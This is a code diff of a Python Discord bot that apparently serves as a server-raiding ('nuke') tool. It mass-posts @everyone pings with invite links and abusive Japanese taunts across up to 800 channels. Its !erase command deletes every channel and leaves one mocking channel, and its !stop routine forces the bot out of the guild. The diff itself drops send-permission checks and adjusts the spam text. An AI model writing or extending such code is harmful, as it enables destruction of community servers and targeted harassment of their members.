@@ -22,6 +22,7 @@ GUILD_ID = 1537420800766771332
 MAX_CHANNELS = 800
 MAX_MESSAGES_PER_CHANNEL = 100
 
+# ✅ 指定されたメッセージ文に更新
 COMBINED_TEXT = (
     "@everyone\n"
     ".∧_∧\n"
@@ -36,9 +37,9 @@ COMBINED_TEXT = (
     "\n"
     "https://discord.gg/SB2hn9eV8\n"
     "https://discord.gg/SB2hn9eV8\n"
-    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
-    "どうしたの両親揃って🫚👩‍⚕️の君！！！😂😂😂"
-    "何も反論できないから妄想でリアル語るしかできないチーくんﾁｰ!ﾁｰ!🤓🐮"
+    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂\n"
+    "どうしたの両親揃って🫚👩‍⚕️の君！！！😂😂😂\n"
+    "何も反"
 )
 
 stop_flag = asyncio.Event()
@@ -78,25 +79,22 @@ async def stop_only(message: str = None):
     rate_limit_hit.clear()
     if message and target_guild:
         try:
-            ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
+            ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
             if ch:
                 await ch.send(message)
         except:
             pass
 
 
-# ✅ !stop用：最優先で強制退出
+# ✅ 修正版：何も待たず 即 強制退出！
 async def force_leave_all(message: str = None):
     global active_jobs
-    # ✅ まず全部止める
+    # ✅ フラグだけ立てて 待つのは完全スルー
     stop_flag.set()
     rate_limit_hit.clear()
     active_jobs = 0
-    for t in background_tasks:
-        t.cancel()
-    background_tasks.clear()
 
-    # ✅ メッセージ（失敗しても続行）
+    # ✅ メッセージ送信（失敗しても続行）
     if message and target_guild:
         try:
             ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
@@ -105,13 +103,13 @@ async def force_leave_all(message: str = None):
         except:
             pass
 
-    # ✅ 何が何でも即退出！
+    # ✅ 即座に退出！ 何も待たない！
     if target_guild:
         try:
             await target_guild.leave()
             print("✅ 強制退出完了")
         except Exception as e:
-            print(f"⚠️ 退出: {e}")
+            print(f"⚠️ 退出リクエスト送信: {e}")
 
 
 async def try_auto_leave(message: str = None):
@@ -125,7 +123,7 @@ async def try_auto_leave(message: str = None):
         background_tasks.clear()
         if message and target_guild:
             try:
-                ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
+                ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
                 if ch:
                     await ch.send(message)
             except:
@@ -343,14 +341,12 @@ async def check(ctx):
     await ctx.send(embed=emb, ephemeral=True)
 
 
-# ✅ 新しい !erase
 @bot.command()
 async def erase(ctx):
     """🗑️ 全チャンネル削除 → 「おちゅかれwww」作成 → Botは居残り"""
     await ctx.send("🗑️ チャンネル全削除中...")
     await delete_all_channels(ctx.guild)
     await ctx.guild.create_text_channel("おちゅかれwww")
-    await ctx.send("✅ 全削除完了 → 「おちゅかれwww」作成済み")
 
 
 @bot.command()
@@ -377,10 +373,10 @@ async def boost(ctx):
     bot.loop.create_task(run_boost(ctx.guild, auto_leave=True))
 
 
-# ✅ 修正版！絶対に止めて抜ける
+# ✅ 修正版：何も待たず 即 強制退出
 @bot.command()
 async def stop(ctx):
-    """🛑 即時全停止 → 確実に退出"""
+    """🛑 即時全停止 → 確実に即退出"""
     await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
     await force_leave_all("🛑 !stop により全処理停止・Bot退出。")
 
